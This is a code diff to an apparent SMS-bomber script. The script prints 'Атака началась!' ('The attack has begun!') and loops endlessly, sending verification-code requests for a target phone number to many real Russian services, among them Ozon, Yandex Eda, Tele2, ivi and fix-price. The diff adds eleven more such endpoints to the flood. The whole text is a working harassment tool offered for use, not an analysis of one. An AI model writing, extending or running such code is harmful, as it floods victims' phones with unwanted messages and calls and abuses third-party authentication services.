@@ -23,6 +23,10 @@ for x in range(12):
 	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+
+_phone9 = _phone[1:]
+_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+
 iteration = 0
 print('Атака началась! \033[32m ')
 print(' ')
@@ -65,7 +69,7 @@ while True:
 		print('\033[F[##]            ')
 
 	try:
-		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+		requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
 		print('\033[F[###]            ')
 	except:
 		print('\033[F[###]            ')
@@ -107,7 +111,7 @@ while True:
 		print('\033[F[#]            ')
 
 	try:
-		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+		requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
 		print('\033[F[####]            ')
 	except:
 		print('\033[F[####]            ')
@@ -159,6 +163,61 @@ while True:
 		print('\033[F[#]            ')
 	except:
 		print('\033[F[#]            ')
+	try:
+		requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
+		print('\033[F[##]            ')
+	except:
+		print('\033[F[##]            ')
+	try:
+		requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
+		print('\033[F[###]            ')
+	except:
+		print('\033[F[###]            ')
+	try:
+		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
+		print('\033[F[####]            ')
+	except:
+		print('\033[F[#]            ')
+	try:
+		requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone})
+		print('\033[F[#]            ')
+	except:
+		print('\033[F[#]            ')
+	try:
+		requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0})
+		print('\033[F[##]            ')
+	except:
+		print('\033[F[##]            ')
+	try:
+		requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"})
+		print('\033[F[###]            ')
+	except:
+		print('\033[F[###]            ')
+	try:
+		requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone})
+		print('\033[F[####]            ')
+	except:
+		print('\033[F[####]            ')
+	try:
+		requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone})
+		print('\033[F[#]            ')
+	except:
+		print('\033[F[#]            ')
+	try:
+		requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
+		print('\033[F[#]            ')
+	except:
+		print('\033[F[#]            ')
+	try:
+		requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"})
+		print('\033[F[#]            ')
+	except:
+		print('\033[F[#]            ')
+	try:
+		requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone})
+		print('\033[F[##]            ')
+	except:
+		print('\033[F[##]            ')
 	try:
 		iteration += 1
 	except:
